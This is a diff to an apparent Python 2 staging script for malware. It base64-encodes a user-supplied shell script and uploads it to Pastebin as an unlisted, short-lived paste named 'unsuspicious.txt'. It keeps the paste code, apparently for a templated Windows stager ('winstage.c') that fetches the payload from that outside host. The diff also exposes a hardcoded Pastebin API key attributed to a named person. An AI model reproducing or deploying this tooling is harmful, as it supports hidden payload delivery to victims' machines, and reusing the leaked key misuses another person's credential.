@@ -5,6 +5,7 @@ import subprocess
 from jinja2 import Template
 import urllib
 import urllib2
+import base64
 
 
 def yesOrNo(prompt):
@@ -25,8 +26,7 @@ def yesOrNo(prompt):
 
 
 def getFileName(prompt):
-    """ A wrapped raw_input that expects the filename of an encrypted shell
-    script from the user """
+    """ A wrapped raw_input that expects the filename of a shell script """
 
     while True:
         filename = raw_input(prompt)
@@ -44,13 +44,14 @@ with open('winstage.c', 'rb') as f:
 
 template = Template(rawCode)
 
-script = getFileName("Please enter the filename of an encrypted shell script you would like to upload to Pastebin for future use (the file should be in this directory): ")
+script = getFileName("Please enter the filename of an shell script you would like to upload to Pastebin for future use (the file should be in this directory): ")
 with open(script, 'rb') as f:
     upload = f.read()
+    coded = base64.b64encode(upload)
 
 # POST request parameters for the Pastebin API
 values = {'api_dev_key': 'acf4072da13aa475dc724c4dab83bbd2',  # logan's API key
-          'api_paste_code': upload,  # message body
+          'api_paste_code': coded,  # message body
           'api_paste_private': '1',  # 0 = public, 1 = unlisted, 2 = private
           'api_paste_name': 'unsuspicious.txt',  # filename
           'api_paste_expire_date': '10M',  # 10 minutes (#1W for 1 week)
@@ -64,6 +65,7 @@ data = urllib.urlencode(values)
 req = urllib2.Request(url, data)
 response = urllib2.urlopen(req)
 the_page = response.read()
+print the_page
 
 # get the URL code from Pastebin's response
 pbCode = the_page[-8:]
